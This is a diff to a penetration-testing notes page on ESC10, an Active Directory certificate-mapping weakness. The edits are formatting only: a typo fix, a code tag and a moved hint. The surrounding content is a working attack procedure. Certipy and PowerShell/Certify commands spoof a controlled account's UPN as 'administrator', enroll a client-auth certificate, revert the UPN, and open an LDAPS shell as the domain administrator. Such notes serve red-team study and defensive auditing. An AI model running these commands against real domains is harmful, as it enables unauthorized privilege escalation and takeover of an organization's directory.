@@ -1,8 +1,9 @@
 # ESC10
 
 {% hint style="info" %}
-Implicit Weak Certificate Mapping (Enrolee can modify own UPN to request cert on behalf of  ANY user)
+Implicit Weak Certificate Mapping (Enrolee can modify own UPN to request cert on behalf of ANY user)
 {% endhint %}
+
 ## Why It Works
 
 * ESC10 is the **Schannel (TLS client-cert auth / LDAPS)** counterpart to ESC9's Kerberos PKINIT attack. It's controlled by two DC registry values under `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel`, rather than a per-template flag:
@@ -27,6 +28,7 @@ certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 
 {% tabs %}
 {% tab title="Certipy" %}
+{% code lineNumbers="true" %}
 ```bash
 ## Same UPN-spoof pattern as ESC9, but authenticate over LDAPS/Schannel instead of Kerberos
 certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn administrator
@@ -34,18 +36,19 @@ certipy req -u <controlled-account>@<domain> -p <password> -ca <CA-Name> -templa
 certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn <controlled-account>@<domain>
 certipy auth -pfx administrator.pfx -dc-ip <DC-IP> -ldap-shell
 ```
+{% endcode %}
 {% endtab %}
 
 {% tab title="PowerShell/RSAT + Certify" %}
+{% hint style="warning" %}
+Windows lacks a simple built-in CLI for LDAPS bind-with-client-certificate (unlike Certipy's `-ldap-shell`). Practically, once you have the `.pfx`, it's easiest to import it into the current user's certificate store and use `System.DirectoryServices.Protocols` in PowerShell, or just transfer the `.pfx` to a Linux box and finish with `certipy auth -ldap-shell` for the actual LDAPS/Schannel step.
+{% endhint %}
+
 ```powershell
 ## 1 & 2 - UPN spoof + enrollment work the same as ESC9 from Windows
 Set-ADUser -Identity <controlled-account> -UserPrincipalName administrator
 Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<client-auth-template>
 Set-ADUser -Identity <controlled-account> -UserPrincipalName <controlled-account>@<domain>
 ```
-
-{% hint style="warning" %}
-Windows lacks a simple built-in CLI for LDAPS bind-with-client-certificate (unlike Certipy's `-ldap-shell`). Practically, once you have the `.pfx`, it's easiest to import it into the current user's certificate store and use `System.DirectoryServices.Protocols` in PowerShell, or just transfer the `.pfx` to a Linux box and finish with `certipy auth -ldap-shell` for the actual LDAPS/Schannel step.
-{% endhint %}
 {% endtab %}
 {% endtabs %}
